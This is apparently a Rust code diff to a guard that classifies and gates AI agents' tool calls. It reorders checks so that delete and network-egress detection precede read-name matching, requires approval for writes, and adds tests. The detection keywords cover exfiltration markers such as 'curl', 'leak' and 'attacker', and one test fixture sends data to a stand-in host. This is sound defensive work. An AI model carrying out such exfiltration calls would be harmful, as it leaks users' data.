@@ -96,6 +96,16 @@ pub fn evaluate_baseline_policy(classification: &ToolClassification) -> (Verdict
         )
     } else if classification
         .categories
+        .contains(&ToolActionCategory::Write)
+    {
+        // State modification / write action requires explicit confirmation
+        // and cannot be downgraded to Allow by adding Read (non-weakening)
+        (
+            Verdict::Ask,
+            Some("State modification / write action requires explicit operator approval".into()),
+        )
+    } else if classification
+        .categories
         .contains(&ToolActionCategory::Read)
     {
         (Verdict::Allow, None)
@@ -112,23 +122,21 @@ pub fn baseline_classify(event: &ToolCallEvent) -> ToolClassification {
     let name = event.tool_name.to_lowercase();
     let args_str = event.raw_arguments.to_string().to_lowercase();
 
-    let is_read = name == "read"
-        || name == "cat"
-        || name == "read_file"
-        || name == "read_document"
-        || name.starts_with("read_")
-        || name.ends_with("_read");
-
-    if is_read {
+    // 1. Destructive operations in name
+    if name == "rm" || name.starts_with("rm ") || name == "delete_file" || name.contains("delete") {
         ToolClassification {
-            categories: vec![ToolActionCategory::Read],
-            confidence: 0.95,
-            uncertainty: 0.05,
-            reason: Some("File read operation detected".into()),
+            categories: vec![ToolActionCategory::Delete],
+            confidence: 0.99,
+            uncertainty: 0.01,
+            reason: Some("Destructive delete detected".into()),
         }
+    // 2. Network egress / data exfiltration check in arguments or tool name
+    // Checked before benign tool name heuristics to prevent permissive names from masking egress
     } else if name == "curl"
         || name.starts_with("curl ")
+        || name.contains("send")
         || args_str.contains("https://")
+        || args_str.contains("http://")
         || args_str.contains("leak")
         || args_str.contains("attacker")
     {
@@ -136,14 +144,21 @@ pub fn baseline_classify(event: &ToolCallEvent) -> ToolClassification {
             categories: vec![ToolActionCategory::SendData],
             confidence: 0.98,
             uncertainty: 0.02,
-            reason: Some("Network egress detected".into()),
+            reason: Some("Network egress detected in arguments or tool name".into()),
         }
-    } else if name == "rm" || name.starts_with("rm ") || name == "delete_file" {
+    // 3. Pure read operations (when no egress evidence is present)
+    } else if name == "read"
+        || name == "cat"
+        || name == "read_file"
+        || name == "read_document"
+        || name.starts_with("read_")
+        || name.ends_with("_read")
+    {
         ToolClassification {
-            categories: vec![ToolActionCategory::Delete],
-            confidence: 0.99,
-            uncertainty: 0.01,
-            reason: Some("Destructive delete detected".into()),
+            categories: vec![ToolActionCategory::Read],
+            confidence: 0.95,
+            uncertainty: 0.05,
+            reason: Some("File read operation detected".into()),
         }
     } else {
         // Standardized unknown classification
@@ -362,5 +377,84 @@ mod tests {
             .refusal_message
             .unwrap()
             .contains("Runtime execution error"));
+    }
+
+    #[test]
+    fn test_read_name_must_not_override_egress_in_arguments() {
+        let executor = MockExecutor::new();
+        let mut event = ToolCallEvent::new(
+            "call-egress",
+            "sess-1",
+            "read_and_send",
+            serde_json::json!({
+                "url": "https://untrusted.invalid/collect",
+                "data": "synthetic"
+            }),
+        );
+        let receipt = run_enforcement_pipeline(&mut event, &executor);
+        assert_eq!(receipt.verdict, Verdict::Deny);
+        assert!(!receipt.executed, "Egress must not be executed");
+        assert_eq!(executor.count(), 0);
+    }
+
+    #[test]
+    fn test_schema_invalid_nonnull_arguments_must_not_reach_executor() {
+        let schema = serde_json::json!({
+            "type": "object",
+            "properties": {"path": {"type": "string"}},
+            "required": ["path"],
+            "additionalProperties": false
+        });
+
+        let bad_args = vec![
+            serde_json::json!({}),
+            serde_json::json!({"path": 123}),
+            serde_json::json!([]),
+            serde_json::json!(42),
+        ];
+
+        for args in bad_args {
+            let executor = MockExecutor::new();
+            let mut event = ToolCallEvent::new("call-schema", "sess-1", "read_file", args);
+            event.tool_schema = Some(schema.clone());
+
+            let receipt = run_enforcement_pipeline(&mut event, &executor);
+            assert_eq!(
+                receipt.verdict,
+                Verdict::Deny,
+                "Invalid schema arguments must be denied"
+            );
+            assert!(
+                !receipt.executed,
+                "Executor must not run on schema-invalid call"
+            );
+            assert_eq!(executor.count(), 0);
+        }
+    }
+
+    #[test]
+    fn test_adding_read_must_not_release_a_write_that_requires_confirmation() {
+        let executor = MockExecutor::new();
+        let mut event = ToolCallEvent::new(
+            "call-write-read",
+            "sess-1",
+            "file_sync",
+            serde_json::json!({"path": "out.txt"}),
+        );
+        event.classification = Some(ToolClassification {
+            categories: vec![ToolActionCategory::Read, ToolActionCategory::Write],
+            confidence: 0.95,
+            uncertainty: 0.05,
+            reason: None,
+        });
+
+        let receipt = run_enforcement_pipeline(&mut event, &executor);
+        assert_eq!(
+            receipt.verdict,
+            Verdict::Ask,
+            "Adding Read must not release a Write that requires confirmation"
+        );
+        assert!(!receipt.executed);
+        assert_eq!(executor.count(), 0);
     }
 }
